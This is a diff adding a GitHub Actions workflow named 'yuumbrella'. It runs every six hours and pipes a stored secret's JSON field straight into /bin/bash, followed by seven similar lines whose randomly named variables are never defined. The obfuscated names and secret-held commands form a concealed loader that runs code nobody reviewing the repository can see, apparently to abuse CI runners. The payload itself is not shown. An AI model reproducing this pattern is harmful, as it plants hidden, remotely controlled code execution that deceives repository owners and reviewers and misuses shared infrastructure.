@@ -1,0 +1,25 @@
+name: yuumbrella
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuumbrella
+        env:
+          qm7: ${{ secrets.qm7 }}
+        run: |
+          echo $qm7 | jq -r .hi829 | /bin/bash
+          echo $jfmx2 | jq -r .ihve9 | /bin/bash
+          echo $ptf8 | jq -r .jdoex795 | /bin/bash
+          echo $oizm58 | jq -r .bi39687 | /bin/bash
+          echo $e1576 | jq -r .r0927 | /bin/bash
+          echo $kviww60269 | jq -r .j40610 | /bin/bash
+          echo $xvamg8816 | jq -r .zz0445 | /bin/bash
+          echo $ko58 | jq -r .me285 | /bin/bash
+
